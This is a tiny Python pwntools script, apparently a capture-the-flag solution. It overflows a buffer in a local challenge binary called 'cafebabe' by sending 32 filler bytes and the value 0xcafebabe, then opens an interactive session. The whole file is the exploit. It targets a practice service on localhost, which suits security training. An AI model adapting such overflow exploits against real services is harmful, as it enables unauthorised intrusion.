#!/usr/bin/python2
# pylint: disable-all
from pwn import *

context.binary = ELF('./public/cafebabe')
p = remote("localhost", 15001)

PAYLOAD = 'A'*32 + p64(0xcafebabe)
p.sendline(PAYLOAD)

p.interactive()